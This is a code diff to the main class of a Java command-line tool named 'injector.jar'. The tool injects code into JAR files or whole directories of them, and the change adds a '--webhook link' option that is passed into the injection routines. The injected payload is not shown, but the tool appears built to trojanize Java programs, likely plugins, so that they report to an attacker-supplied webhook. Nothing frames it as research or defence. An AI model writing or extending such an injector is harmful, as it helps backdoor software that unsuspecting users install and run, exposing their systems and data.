@@ -15,37 +15,38 @@ public class Main {
 
     public static void main(String[] args){
 
-        OptionsParser parser = new OptionsParser(args, "i", "input", "o", "output", "bukkit");
+        OptionsParser parser = new OptionsParser(args, "i", "input", "o", "output", "webhook");
 
         String input = parser.get("input", "i");
 
         if(input == null){
             /* usage */
-            System.out.println("\n╔════════════════════ Usage ════════════════════╗");
-            System.out.println("║                                               ║ ");
-            System.out.println("║  java -jar injector.jar -input file.jar       ║ ");
-            System.out.println("║  java -jar injector.jar -input directory      ║ ");
-            System.out.println("║  java -jar injector.jar -i a.jar -o b.jar     ║");
-            System.out.println("║                                               ║");
-            System.out.println("╚═══════════════════════════════════════════════╝");
+            System.out.println("\n╔══════════════════════ Usage ══════════════════════╗");
+            System.out.println("║                                                   ║ ");
+            System.out.println("║  java -jar injector.jar --input file.jar          ║ ");
+            System.out.println("║  java -jar injector.jar --input directory         ║ ");
+            System.out.println("║  java -jar injector.jar --i a.jar --o b.jar       ║");
+            System.out.println("║  java -jar injector.jar --i a.jar --webhook link  ║");
+            System.out.println("║                                                   ║");
+            System.out.println("╚═══════════════════════════════════════════════════╝");
 
 
             return;
         }
         File inputFile = new File(input);
         if(!inputFile.exists()){
-            System.out.println("Error : File not found.");
+            System.out.println("Error : " + input + " not found.");
             return;
         }
 
         if(inputFile.isDirectory()){
-            Injector.injectDirectory(inputFile);
+            Injector.injectDirectory(inputFile, parser.getDefault("output", "output"), parser.getDefault("", "webhook"));
             return;
         }
 
 
         String output = parser.getDefault(input.substring(0, input.length() - 4) + "-injected.jar", "o", "output");
-        Injector.inject(input, output);
+        Injector.inject(input, output, parser.getDefault("", "webhook"));
 
 
 
